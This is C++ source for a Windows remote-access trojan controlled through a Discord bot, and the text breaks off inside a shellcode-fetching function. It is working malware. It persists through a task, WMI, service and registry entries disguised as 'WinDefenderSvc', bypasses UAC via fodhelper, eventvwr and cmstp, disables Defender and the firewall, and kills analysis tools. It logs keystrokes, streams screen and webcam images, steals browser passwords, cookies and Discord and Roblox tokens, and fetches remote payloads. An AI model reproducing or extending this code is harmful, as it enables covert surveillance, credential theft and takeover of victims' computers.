#include <dpp/dpp.h>
#include <nlohmann/json.hpp>
#include <Windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <dwmapi.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <wbemidl.h>
#include <comdef.h>
#include <taskschd.h>
#include <Msi.h>
#include <shellapi.h>
#include <ShlObj.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <fstream>
#include <sstream>
#include <thread>
#include <mutex>
#include <chrono>
#include <filesystem>
#include <regex>
#include <unordered_map>
#include <conio.h>
#include <mmsystem.h>
#include <dsound.h>
#include <Audioclient.h>
#include <mmdeviceapi.h>
#include <Functiondiscoverykeys_devpkey.h>
#include <iphlpapi.h>
#include <winternl.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <AccCtrl.h>
#include <aclapi.h>
#include <sddl.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mstcpip.h>
#include <powrprof.h>
#include <virtdisk.h>
#include <vss.h>
#include <winioctl.h>
#include <ntsecapi.h>
#include <cstdio>
#include <sqlite3.h>
#include <gdiplus.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "dsound.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "msi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "powrprof.lib")
#pragma comment(lib, "virtdisk.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
using json = nlohmann::json;
namespace fs = std::filesystem;
template<size_t N> struct XorStr {
    char s[N];
    constexpr XorStr(const char(&str)[N]) : s{} {
        for (size_t i = 0; i < N; ++i) s[i] = str[i] ^ 0x55;
    }
    std::string decrypt() const {
        std::string r; r.reserve(N - 1);
        for (size_t i = 0; i < N - 1; ++i) r.push_back(s[i] ^ 0x55);
        return r;
    }
};
#define OB(s) (XorStr(s).decrypt().c_str())
const std::string BOT_TOKEN = "YOUR_BOT_TOKEN";
const dpp::snowflake GUILD_ID = 123456789012345678;
dpp::cluster* bot = nullptr;
std::unordered_map<std::string, dpp::snowflake> channels;
std::mutex channel_mutex;
HHOOK kbdHook = NULL;
std::ofstream keylogFile;
std::string keystrokeBuffer;
std::mutex keyMutex;
bool liveScreenActive = false, liveWebcamActive = false;
std::thread liveScreenThread, liveWebcamThread;
std::string exec(const char* cmd) {
    std::array<char, 128> buffer; std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) return "exec failed";
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
        result += buffer.data();
    return result;
}
void splitSend(const dpp::channel& ch, const std::string& msg) {
    if (msg.size() <= 2000) { bot->message_create(dpp::message(ch.id, msg)); return; }
    for (size_t i = 0; i < msg.size(); i += 1990) {
        std::string part = msg.substr(i, 1990);
        bot->message_create(dpp::message(ch.id, part));
    }
}
void sendChannel(const std::string& channelName, const std::string& content) {
    std::lock_guard<std::mutex> lock(channel_mutex);
    if (channels.count(channelName)) {
        dpp::channel ch; ch.id = channels[channelName];
        splitSend(ch, content);
    }
}
void addScheduledTask() {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    ITaskService* pService = NULL;
    HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) return;
    pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    ITaskFolder* pRootFolder = NULL;
    pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    pRootFolder->DeleteTask(_bstr_t(L"WinDefenderSvc"), 0);
    ITaskDefinition* pTask = NULL;
    pService->NewTask(0, &pTask);
    IPrincipal* pPrincipal = NULL;
    pTask->get_Principal(&pPrincipal);
    pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
    pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
    ITriggerCollection* pTriggerColl = NULL;
    pTask->get_Triggers(&pTriggerColl);
    ITrigger* pTrigger = NULL;
    pTriggerColl->Create(TASK_TRIGGER_LOGON, &pTrigger);
    IActionCollection* pActionColl = NULL;
    pTask->get_Actions(&pActionColl);
    IAction* pAction = NULL;
    pActionColl->Create(TASK_ACTION_EXEC, &pAction);
    IExecAction* pExecAction = NULL;
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    wchar_t path[MAX_PATH]; GetModuleFileNameW(NULL, path, MAX_PATH);
    pExecAction->put_Path(_bstr_t(path));
    IRegisteredTask* pRegisteredTask = NULL;
    pRootFolder->RegisterTaskDefinition(_bstr_t(L"WinDefenderSvc"), pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegisteredTask);
    pRegisteredTask->Release(); pExecAction->Release(); pAction->Release(); pTrigger->Release(); pTriggerColl->Release(); pPrincipal->Release(); pTask->Release(); pRootFolder->Release(); pService->Release(); CoUninitialize();
}
void addWMIEvent() {
    HRESULT hr; IWbemLocator* pLoc = NULL; IWbemServices* pSvc = NULL; IWbemClassObject* pFilterClass = NULL, *pFilterInst = NULL, *pConsumerClass = NULL, *pConsumerInst = NULL;
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, 0, 0, 0, &pSvc);
    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    hr = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    hr = pFilterClass->SpawnInstance(0, &pFilterInst);
    std::wstring query = L"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'";
    hr = pFilterInst->Put(L"Name", 0, &_variant_t(L"MintedFilter"), 0);
    hr = pFilterInst->Put(L"QueryLanguage", 0, &_variant_t(L"WQL"), 0);
    hr = pFilterInst->Put(L"Query", 0, &_variant_t(query.c_str()), 0);
    hr = pSvc->PutInstance(pFilterInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    hr = pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
    hr = pConsumerClass->SpawnInstance(0, &pConsumerInst);
    wchar_t path[MAX_PATH]; GetModuleFileNameW(NULL, path, MAX_PATH);
    std::wstring cmdLine = std::wstring(L"\"") + path + L"\"";
    hr = pConsumerInst->Put(L"Name", 0, &_variant_t(L"MintedConsumer"), 0);
    hr = pConsumerInst->Put(L"CommandLineTemplate", 0, &_variant_t(cmdLine.c_str()), 0);
    hr = pSvc->PutInstance(pConsumerInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pConsumerInst->Release(); pConsumerClass->Release(); pFilterInst->Release(); pFilterClass->Release(); pSvc->Release(); pLoc->Release(); CoUninitialize();
}
void addService() {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return;
    wchar_t path[MAX_PATH]; GetModuleFileNameW(NULL, path, MAX_PATH);
    SC_HANDLE hService = CreateServiceW(hSCManager, L"WinDefenderSvc", L"WinDefenderSvc", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL);
    if (hService) { StartServiceW(hService, 0, NULL); CloseServiceHandle(hService); }
    CloseServiceHandle(hSCManager);
}
void addRegRun() {
    HKEY hKey; RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    wchar_t path[MAX_PATH]; GetModuleFileNameW(NULL, path, MAX_PATH);
    RegSetValueExW(hKey, L"WinDefenderSvc", 0, REG_SZ, (BYTE*)path, (lstrlenW(path)+1)*2);
    RegCloseKey(hKey);
}
void removePersistence() {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    ITaskService* pService = NULL;
    if SUCCEEDED(CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService)) {
        pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        ITaskFolder* pRootFolder = NULL;
        pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        pRootFolder->DeleteTask(_bstr_t(L"WinDefenderSvc"), 0);
        pRootFolder->Release();
        pService->Release();
    }
    CoUninitialize();
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager) {
        SC_HANDLE hService = OpenServiceW(hSCManager, L"WinDefenderSvc", DELETE | SERVICE_STOP);
        if (hService) { SERVICE_STATUS ss; ControlService(hService, SERVICE_CONTROL_STOP, &ss); DeleteService(hService); CloseServiceHandle(hService); }
        CloseServiceHandle(hSCManager);
    }
    HKEY hKey;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegDeleteValueW(hKey, L"WinDefenderSvc");
    RegCloseKey(hKey);
}
void persistenceWatchdog() {
    while (true) {
        addScheduledTask(); addWMIEvent(); addService(); addRegRun();
        Sleep(60000);
    }
}
void fodhelperBypass() {
    HKEY hKey;
    DWORD dw = 0;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, &dw);
    wchar_t path[MAX_PATH]; GetModuleFileNameW(NULL, path, MAX_PATH);
    RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)path, (lstrlenW(path)+1)*2);
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", 2);
    RegCloseKey(hKey);
    ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
    Sleep(5000);
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
}
void eventvwrBypass() {
    HKEY hKey;
    DWORD dw = 0;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile\\shell\\open\\command", 0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, &dw);
    wchar_t path[MAX_PATH]; GetModuleFileNameW(NULL, path, MAX_PATH);
    RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)path, (lstrlenW(path)+1)*2);
    RegCloseKey(hKey);
    ShellExecuteW(NULL, L"open", L"eventvwr.exe", NULL, NULL, SW_HIDE);
    Sleep(5000);
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile");
}
void cmstpBypass() {
    std::wstring infPath = fs::temp_directory_path().wstring() + L"\\minted.inf";
    std::wofstream ofs(infPath);
    ofs << L"[Version]\nSignature=$CHICAGO$\n[DefaultInstall]\nRunPostSetupCommands=RunPostSetup\n[RunPostSetup]\n" << std::wstring(GetCommandLineW()) << L"\n";
    ofs.close();
    ShellExecuteW(NULL, L"open", L"cmstp.exe", (L"/s " + infPath).c_str(), NULL, SW_HIDE);
    Sleep(5000);
    DeleteFileW(infPath.c_str());
}
bool isElevated() {
    BOOL f = FALSE;
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION e; DWORD sz = sizeof(e);
        GetTokenInformation(token, TokenElevation, &e, sz, &sz);
        f = e.TokenIsElevated;
        CloseHandle(token);
    }
    return f;
}
void getsystem() {
    HANDLE hPipe;
    hPipe = CreateNamedPipeW(L"\\\\.\\pipe\\mintedsvc", PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 1, 0, 0, NMPWAIT_USE_DEFAULT_WAIT, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) return;
    std::thread([=]() {
        if (ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            BYTE buf[256]; DWORD read;
            ReadFile(hPipe, buf, sizeof(buf), &read, NULL);
            CloseHandle(hPipe);
        }
    }).detach();
    STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi;
    wchar_t cmd[] = L"cmd.exe /c echo test > \\\\.\\pipe\\mintedsvc";
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    Sleep(1000);
}
bool checkVM() {
    BOOL isVM = FALSE;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t val[256]; DWORD sz = sizeof(val);
        RegQueryValueExW(hKey, L"0", NULL, NULL, (LPBYTE)val, &sz);
        if (wcsstr(val, L"VMware") || wcsstr(val, L"Virtual") || wcsstr(val, L"VBOX")) isVM = TRUE;
        RegCloseKey(hKey);
    }
    char mac[6]; ULONG len = 6;
    IP_ADAPTER_INFO adapter[16]; DWORD bufLen = sizeof(adapter);
    if (GetAdaptersInfo(adapter, &bufLen) == NO_ERROR) {
        memcpy(mac, adapter[0].Address, 6);
        if (mac[0]==0x00 && mac[1]==0x0C && mac[2]==0x29) isVM = TRUE;
        if (mac[0]==0x08 && mac[1]==0x00 && mac[2]==0x27) isVM = TRUE;
    }
    return isVM;
}
bool checkDebugger() {
    if (IsDebuggerPresent()) return true;
    BOOL bDebug = FALSE; CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug); if (bDebug) return true;
    __try { __asm int 3; return true; } __except(EXCEPTION_EXECUTE_HANDLER) {}
    return false;
}
void disableDefender() {
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
    system("powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
    system("netsh advfirewall set allprofiles state off");
}
void killMonitors() {
    const wchar_t* bad[] = { L"wireshark.exe", L"procmon.exe", L"processhacker.exe", L"ida.exe", L"x64dbg.exe", L"ollydbg.exe" };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) do {
        for (int i=0; i<6; ++i) if (wcsstr(pe.szExeFile, bad[i])) { HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID); TerminateProcess(h, 0); CloseHandle(h); break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
}
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        std::lock_guard<std::mutex> lock(keyMutex);
        char buf[32] = {0};
        if (p->vkCode >= 0x30 && p->vkCode <= 0x5A) buf[0] = MapVirtualKey(p->vkCode, MAPVK_VK_TO_CHAR);
        else if (p->vkCode == VK_SPACE) strcpy(buf, " ");
        else if (p->vkCode == VK_RETURN) strcpy(buf, "[ENTER]");
        else if (p->vkCode == VK_BACK) strcpy(buf, "[BACKSPACE]");
        else if (p->vkCode == VK_TAB) strcpy(buf, "[TAB]");
        else if (p->vkCode == VK_ESCAPE) strcpy(buf, "[ESC]");
        else if (p->vkCode == VK_LEFT) strcpy(buf, "[LEFT]");
        else if (p->vkCode == VK_RIGHT) strcpy(buf, "[RIGHT]");
        else if (p->vkCode == VK_UP) strcpy(buf, "[UP]");
        else if (p->vkCode == VK_DOWN) strcpy(buf, "[DOWN]");
        else if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) strcpy(buf, "[SHIFT]");
        else if (p->vkCode == VK_CONTROL) strcpy(buf, "[CTRL]");
        else if (p->vkCode == VK_MENU) strcpy(buf, "[ALT]");
        else if (p->vkCode == VK_CAPITAL) strcpy(buf, "[CAPSLOCK]");
        else if (p->vkCode == VK_NUMLOCK) strcpy(buf, "[NUMLOCK]");
        else if (p->vkCode == VK_SCROLL) strcpy(buf, "[SCROLLLOCK]");
        else if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) strcpy(buf, "[WIN]");
        else if (p->vkCode == VK_DELETE) strcpy(buf, "[DELETE]");
        else if (p->vkCode == VK_INSERT) strcpy(buf, "[INSERT]");
        else if (p->vkCode == VK_HOME) strcpy(buf, "[HOME]");
        else if (p->vkCode == VK_END) strcpy(buf, "[END]");
        else if (p->vkCode == VK_PRIOR) strcpy(buf, "[PGUP]");
        else if (p->vkCode == VK_NEXT) strcpy(buf, "[PGDN]");
        else if (p->vkCode == VK_SNAPSHOT) strcpy(buf, "[PRTSC]");
        else if (p->vkCode == VK_PAUSE) strcpy(buf, "[PAUSE]");
        else sprintf(buf, "[%d]", p->vkCode);
        keystrokeBuffer += buf;
        keylogFile << buf; keylogFile.flush();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
void startKeylogger() {
    wchar_t tmp[MAX_PATH]; GetEnvironmentVariableW(L"TEMP", tmp, MAX_PATH);
    std::wstring path = std::wstring(tmp) + L"\\syslog.dat";
    keylogFile.open(path, std::ios::app | std::ios::binary);
    kbdHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
}
void keylogFlush() {
    std::lock_guard<std::mutex> lock(keyMutex);
    if (!keystrokeBuffer.empty()) {
        sendChannel("spam", keystrokeBuffer);
        keystrokeBuffer.clear();
    }
}
std::string GetKnownFolderPath(const KNOWNFOLDERID& folderId) {
    PWSTR path = nullptr;
    if (SUCCEEDED(SHGetKnownFolderPath(folderId, 0, NULL, &path))) {
        std::wstring wstr(path);
        CoTaskMemFree(path);
        return std::string(wstr.begin(), wstr.end());
    }
    return "";
}
HBITMAP CaptureScreen(int& w, int& h) {
    HWND desktop = GetDesktopWindow(); HDC dc = GetDC(desktop);
    w = GetSystemMetrics(SM_CXSCREEN); h = GetSystemMetrics(SM_CYSCREEN);
    HDC memdc = CreateCompatibleDC(dc); HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
    SelectObject(memdc, bmp); BitBlt(memdc, 0, 0, w, h, dc, 0, 0, SRCCOPY);
    DeleteDC(memdc); ReleaseDC(desktop, dc);
    return bmp;
}
std::string bmpToPNG(HBITMAP bmp) {
    std::vector<BYTE> buf; IStream* stream = NULL; CreateStreamOnHGlobal(NULL, TRUE, &stream);
    Gdiplus::GdiplusStartupInput gdiSI; ULONG_PTR gdiToken; Gdiplus::GdiplusStartup(&gdiToken, &gdiSI, NULL);
    Gdiplus::Bitmap* gdiBmp = Gdiplus::Bitmap::FromHBITMAP(bmp, NULL);
    CLSID pngClsid; CLSIDFromString(L"{557cf406-1a04-11d3-9a73-0000f81ef32e}", &pngClsid);
    gdiBmp->Save(stream, &pngClsid); delete gdiBmp;
    Gdiplus::GdiplusShutdown(gdiToken);
    LARGE_INTEGER pos = {0}; stream->Seek(pos, STREAM_SEEK_SET, NULL);
    STATSTG stat; stream->Stat(&stat, STATFLAG_NONAME);
    buf.resize(stat.cbSize.QuadPart); ULONG read; stream->Read(buf.data(), (ULONG)stat.cbSize.QuadPart, &read);
    stream->Release();
    return std::string(buf.begin(), buf.end());
}
void streamScreen() {
    while (liveScreenActive) {
        int w, h; HBITMAP bmp = CaptureScreen(w, h);
        if (bmp) {
            std::string png = bmpToPNG(bmp);
            bot->message_create(dpp::message(channels["spam"], "", dpp::attachment("screenshot.png", png)));
            DeleteObject(bmp);
        }
        Sleep(2000);
    }
}
void streamWebcam() {
    while (liveWebcamActive) {
        HWND hWndC = capCreateCaptureWindowW(L"Webcam", WS_CHILD, 0, 0, 1, 1, GetDesktopWindow(), 0);
        if (hWndC) {
            capDriverConnect(hWndC, 0);
            capGrabFrame(hWndC);
            HBITMAP hbm = capGetFrameBitmap(hWndC);
            if (hbm) { std::string png = bmpToPNG(hbm); bot->message_create(dpp::message(channels["recordings"], "", dpp::attachment("webcam.png", png))); DeleteObject(hbm); }
            capDriverDisconnect(hWndC);
            DestroyWindow(hWndC);
        }
        Sleep(2000);
    }
}
std::string DPAPIDecrypt(const std::vector<BYTE>& blob) {
    DATA_BLOB in, out; in.pbData = (BYTE*)blob.data(); in.cbData = blob.size();
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        std::string res((char*)out.pbData, out.cbData);
        LocalFree(out.pbData);
        return res;
    }
    return "";
}
std::string stealChromePasswords() {
    std::string result;
    std::string localAppData = GetKnownFolderPath(FOLDERID_LocalAppData);
    std::wstring wlocal(localAppData.begin(), localAppData.end());
    std::wstring loginData = wlocal + L"\\Google\\Chrome\\User Data\\Default\\Login Data";
    std::ifstream src(loginData, std::ios::binary); if (!src) return "no file";
    std::string db((std::istreambuf_iterator<char>(src)), std::istreambuf_iterator<char>());
    src.close();
    std::wstring tmpPath = fs::temp_directory_path().wstring() + L"\\chrome_logins.db";
    std::ofstream ofs(tmpPath, std::ios::binary); ofs.write(db.data(), db.size()); ofs.close();
    sqlite3* dbPtr; sqlite3_open16(tmpPath.c_str(), &dbPtr);
    sqlite3_stmt* stmt;
    sqlite3_prepare_v2(dbPtr, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, NULL);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string url = (const char*)sqlite3_column_text(stmt, 0);
        std::string user = (const char*)sqlite3_column_text(stmt, 1);
        std::vector<BYTE> blob((BYTE*)sqlite3_column_blob(stmt, 2), (BYTE*)sqlite3_column_blob(stmt,2) + sqlite3_column_bytes(stmt,2));
        std::string pass = DPAPIDecrypt(blob);
        result += url + " : " + user + " : " + pass + "\n";
    }
    sqlite3_finalize(stmt); sqlite3_close(dbPtr); DeleteFileW(tmpPath.c_str());
    return result;
}
std::string stealEdgePasswords() {
    std::string result;
    std::string localAppData = GetKnownFolderPath(FOLDERID_LocalAppData);
    std::wstring wlocal(localAppData.begin(), localAppData.end());
    std::wstring loginData = wlocal + L"\\Microsoft\\Edge\\User Data\\Default\\Login Data";
    std::ifstream src(loginData, std::ios::binary); if (!src) return "no file";
    std::string db((std::istreambuf_iterator<char>(src)), std::istreambuf_iterator<char>());
    src.close();
    std::wstring tmpPath = fs::temp_directory_path().wstring() + L"\\edge_logins.db";
    std::ofstream ofs(tmpPath, std::ios::binary); ofs.write(db.data(), db.size()); ofs.close();
    sqlite3* dbPtr; sqlite3_open16(tmpPath.c_str(), &dbPtr);
    sqlite3_stmt* stmt;
    sqlite3_prepare_v2(dbPtr, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, NULL);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string url = (const char*)sqlite3_column_text(stmt, 0);
        std::string user = (const char*)sqlite3_column_text(stmt, 1);
        std::vector<BYTE> blob((BYTE*)sqlite3_column_blob(stmt, 2), (BYTE*)sqlite3_column_blob(stmt,2) + sqlite3_column_bytes(stmt,2));
        std::string pass = DPAPIDecrypt(blob);
        result += url + " : " + user + " : " + pass + "\n";
    }
    sqlite3_finalize(stmt); sqlite3_close(dbPtr); DeleteFileW(tmpPath.c_str());
    return result;
}
std::string stealFirefoxPasswords() { return "NSS3 decryption not implemented"; }
std::string stealRobloxToken() {
    std::string localAppData = GetKnownFolderPath(FOLDERID_LocalAppData);
    std::wstring wlocal(localAppData.begin(), localAppData.end());
    std::wstring cookiesPath = wlocal + L"\\Roblox\\Cookies";
    if (!fs::exists(cookiesPath)) return "not found";
    std::ifstream f(cookiesPath, std::ios::binary); std::string data((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    size_t pos = data.find(".ROBLOSECURITY");
    if (pos != std::string::npos) {
        size_t end = data.find(";", pos); return data.substr(pos, end-pos);
    }
    return "no token";
}
std::string stealDiscordToken() {
    std::string appData = GetKnownFolderPath(FOLDERID_RoamingAppData);
    std::wstring wapp(appData.begin(), appData.end());
    std::wstring discordPath = wapp + L"\\Discord\\Local Storage\\leveldb\\";
    std::string tokens;
    for (auto& p : fs::directory_iterator(discordPath)) {
        if (p.path().extension() == L".ldb" || p.path().extension() == L".log") {
            std::ifstream f(p.path(), std::ios::binary); std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            std::regex tokenRegex(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
            std::smatch m; while (std::regex_search(content, m, tokenRegex)) { tokens += m.str() + "\n"; content = m.suffix(); }
        }
    }
    return tokens;
}
std::string stealCookies() {
    std::string result;
    std::string localAppData = GetKnownFolderPath(FOLDERID_LocalAppData);
    std::wstring wlocal(localAppData.begin(), localAppData.end());
    std::wstring chromeCookies = wlocal + L"\\Google\\Chrome\\User Data\\Default\\Cookies";
    std::ifstream f(chromeCookies, std::ios::binary); std::string db((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    std::wstring tmp = fs::temp_directory_path().wstring() + L"\\chrome_cookies.db";
    std::ofstream ofs(tmp, std::ios::binary); ofs.write(db.data(), db.size()); ofs.close();
    sqlite3* dbPtr; sqlite3_open16(tmp.c_str(), &dbPtr);
    sqlite3_stmt* stmt; sqlite3_prepare_v2(dbPtr, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, NULL);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string host = (const char*)sqlite3_column_text(stmt, 0);
        std::string name = (const char*)sqlite3_column_text(stmt, 1);
        std::vector<BYTE> blob((BYTE*)sqlite3_column_blob(stmt,2), (BYTE*)sqlite3_column_blob(stmt,2)+sqlite3_column_bytes(stmt,2));
        std::string val = DPAPIDecrypt(blob);
        result += host + "\t" + name + "\t" + val + "\n";
    }
    sqlite3_finalize(stmt); sqlite3_close(dbPtr); DeleteFileW(tmp.c_str());
    return result;
}
std::string stealHistory() { return "not implemented"; }
std::string stealCreditCards() { return "not implemented"; }
std::string stealMailCredentials() { return "not implemented"; }
std::string findCryptoWallets() { return "not implemented"; }
void downloadFile(const std::string& url, const std::wstring& dest) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    URL_COMPONENTS urlComp = { sizeof(urlComp) }; wchar_t host[256], path[1024];
    urlComp.lpszHostName = host; urlComp.dwHostNameLength = 256; urlComp.lpszUrlPath = path; urlComp.dwUrlPathLength = 1024;
    std::wstring wurl(url.begin(), url.end());
    WinHttpCrackUrl(wurl.c_str(), 0, 0, &urlComp);
    HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    std::ofstream ofs(dest, std::ios::binary);
    DWORD bytesRead; BYTE buffer[4096];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead) ofs.write((char*)buffer, bytesRead);
    ofs.close();
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}
void execShellcode(const std::string& url) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    URL_COMPONENTS uc = { sizeof(uc) }; wchar_t host[256], path[1024];
    uc.lpszHostName = host; uc.dwHostNameLength = 256; uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
    std::wstring wurl(url.begin(), url.end());
    WinHttpCrackUrl(wurl.c_str(), 0, 0, &uc);
    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    std::vector<BYTE> sc; DWORD read; BYTE buf[4096];
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read) sc.insert(sc.end(), buf, buf+read);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
